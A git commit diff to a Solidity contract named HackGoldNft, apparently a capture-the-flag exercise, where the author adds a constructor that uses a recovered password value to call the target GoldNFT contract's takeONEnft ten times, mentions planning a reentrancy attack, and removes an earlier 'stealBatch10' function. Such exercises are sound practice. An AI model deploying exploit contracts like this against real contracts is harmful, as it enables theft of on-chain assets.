39febc7a4676fd380f2c055f5a53e0d05fef8ff2
jclare93 <106985713+lemonFlavDaBest@users.noreply.github.com>
2023-03-29 08:38:53 -0700

    Update HackGoldNft.sol
    yo ho ho. I have the password, now i just wannta get the reentrancy now i think

--- src/HackGoldNft.sol
+++ src/HackGoldNft.sol
@@ -1,14 +1,38 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;
 
+import "./GoldNFT.sol";
+
+interface IERC721Receiver {
+    /**
+     * @dev Whenever an {IERC721} `tokenId` token is transferred to this contract via {IERC721-safeTransferFrom}
+     * by `operator` from `from`, this function is called.
+     *
+     * It must return its Solidity selector to confirm the token transfer.
+     * If any other value is returned or the interface is not implemented by the recipient, the transfer will be reverted.
+     *
+     * The selector can be obtained in Solidity with `IERC721Receiver.onERC721Received.selector`.
+     */
+    function onERC721Received(
+        address operator,
+        address from,
+        uint256 tokenId,
+        bytes calldata data
+    ) external returns (bytes4);
+}
 
 contract HackGoldNft {
 
     address immutable I_PASS_MANAGER = 0xe43029d90B47Dd47611BAd91f24F87Bc9a03AEC2;
+    GoldNFT public nft;
     address public owner;
 
-    constructor(){
+    constructor(address _goldNFT){
         owner = msg.sender;
+        nft = GoldNFT(_goldNFT);
+        for(uint256 i =0;i<10; i++){
+        nft.takeONEnft(0x23ee4bc3b6ce4736bb2c0004c972ddcbe5c9795964cdd6351dadba79a295f5fe);
+        }
     }
 
     modifier isOwner() {
@@ -17,12 +41,6 @@ contract HackGoldNft {
         _;
     }
 
-    function stealBatch10() external isOwner returns(bool){
-        for(uint i=0; i<10;){
-            I_PASS_MANAGER.call(abi.encodeWithSignature("0x0daa5703(uint,uint", i, i))
-            unchecked {
-                i++;
-            }
-        }
-    }
+    
+
 }
